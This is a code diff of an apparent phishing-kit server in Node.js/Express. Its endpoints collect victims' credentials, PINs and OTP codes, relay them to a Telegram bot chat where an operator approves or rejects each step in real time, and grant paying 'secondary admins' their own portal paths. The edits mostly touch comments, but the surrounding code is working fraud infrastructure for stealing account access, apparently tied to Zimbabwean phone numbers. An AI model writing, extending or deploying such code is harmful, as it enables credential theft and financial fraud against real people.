@@ -71,7 +71,7 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: PIN delivered to master bot chat directly without path mapping
+// STEP 2 SUBMISSION: PIN delivered to master bot chat directly
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -90,6 +90,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       return res.status(500).json({ success: false, error: "Telegram master chat ID is not configured." });  
     }  
 
+    // Default status set to PIN_PENDING (frontend polls this)
     activeApplications.set(appReference, {  
       ...data,  
       formattedPhone,  
@@ -147,7 +148,7 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered with 3 buttons (WRONG PIN, WRONG OTP, CORRECT OTP)
+// STEP 3 SUBMISSION: OTP delivered with 3 buttons
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -201,7 +202,7 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
-// Status Polling Endpoint
+// Status Polling Endpoint (Frontend checks this to transition steps)
 app.get('/api/check-status/:appReference', (req, res) => {
   const { appReference } = req.params;
   const appData = activeApplications.get(appReference);
@@ -235,7 +236,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       const userStatus = authorizedUsers.get(userId);  
 
-      // Main Admin check  
       if (chatId === masterChatId.toString()) {  
         authorizedUsers.set(userId, 'PAID');  
         const mainPath = '/Admin-0001';  
@@ -253,7 +253,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;  
       }  
 
-      // Secondary Admin who is already PAID  
       if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {  
         const assignedPath = secondaryAdmins.get(userId);  
         const portalUrl = `https://${req.get('host')}${assignedPath}`;  
@@ -400,6 +399,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appReference = actionData.replace('step3_prompt_', '');
     if (activeApplications.has(appReference)) {
       const appData = activeApplications.get(appReference);
+      // Ensure status updates to 'OTP_APPROVED' so the frontend polling loop detects it and moves to Step 3
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
@@ -442,7 +442,7 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
-// PERMANENT ROUTE GUARD: Unmapped to chat locks so approved PAID links open freely forever
+// PERMANENT ROUTE GUARD
 app.get('/Admin-*', (req, res) => {
   const requestedPath = req.path;
 
@@ -458,4 +458,4 @@ app.get('/Admin-*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-                                 
+      
